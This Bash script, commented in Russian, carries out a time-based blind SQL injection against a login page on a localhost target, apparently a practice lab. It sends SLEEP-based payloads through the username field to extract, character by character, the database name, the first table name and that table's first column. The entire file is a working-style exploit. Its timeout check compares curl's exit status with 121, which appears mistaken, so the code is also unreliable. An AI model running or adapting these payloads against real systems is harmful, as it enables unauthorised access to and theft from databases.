#!/bin/bash

URL="http://localhost/gareev/login.php"

echo "[+] Получаем имя базы данных..."

# Получаем длину имени базы данных
for i in {1..20}; do
  echo -n "."
  curl -s -X POST "$URL" \
       -d "username=admin' AND IF(LENGTH(DATABASE())=$i, SLEEP(2), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null

  if [ $? -eq 121 ]; then
    len_db=$i
    break
  fi
done

echo -e "\n[+] Длина имени базы данных: $len_db"

# Получаем имя базы данных посимвольно
db_name=""
for ((i=1; i<=$len_db; i++)); do
  for c in {a..z} {A..Z} {0..9} _; do
    curl -s -X POST "$URL" \
         -d "username=admin' AND IF(SUBSTRING(DATABASE(),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null

    if [ $? -eq 121 ]; then
      db_name+="$c"
      echo -n "$c"
      break
    fi
  done
done

echo -e "\n\n[+] Имя базы данных: $db_name"

# --------------------------------------------

echo -e "\n[+] Получаем имя первой таблицы..."

# Получаем длину имени первой таблицы
for i in {1..50}; do
  echo -n "."
  curl -s -X POST "$URL" \
       -d "username=admin' AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null

  if [ $? -eq 121 ]; then
    len_tbl=$i
    break
  fi
done

echo -e "\n[+] Длина имени таблицы: $len_tbl"

# Получаем имя таблицы посимвольно
table_name=""
for ((i=1; i<=$len_tbl; i++)); do
  for c in {a..z} {A..Z} {0..9} _; do
    curl -s -X POST "$URL" \
         -d "username=admin' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='$db_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null

    if [ $? -eq 121 ]; then
      table_name+="$c"
      echo -n "$c"
      break
    fi
  done
done

echo -e "\n\n[+] Имя таблицы: $table_name"

# --------------------------------------------

echo -e "\n[+] Получаем первый столбец таблицы..."

# Получаем длину имени первого столбца
for i in {1..50}; do
  echo -n "."
  curl -s -X POST "$URL" \
       -d "username=admin' AND IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1))=$i, SLEEP(2), 0)-- -&password=anything" \
       --connect-timeout 3 --max-time 5 > /dev/null

  if [ $? -eq 121 ]; then
    len_col=$i
    break
  fi
done

echo -e "\n[+] Длина имени первого столбца: $len_col"

# Получаем имя столбца посимвольно
col_name=""
for ((i=1; i<=$len_col; i++)); do
  for c in {a..z} {A..Z} {0..9} _; do
    curl -s -X POST "$URL" \
         -d "username=admin' AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='$table_name' LIMIT 0,1),$i,1)='$c', SLEEP(2), 0)-- -&password=anything" \
         --connect-timeout 3 --max-time 5 > /dev/null

    if [ $? -eq 121 ]; then
      col_name+="$c"
      echo -n "$c"
      break
    fi
  done
done

echo -e "\n\n[+] Первый столбец таблицы: $col_name"
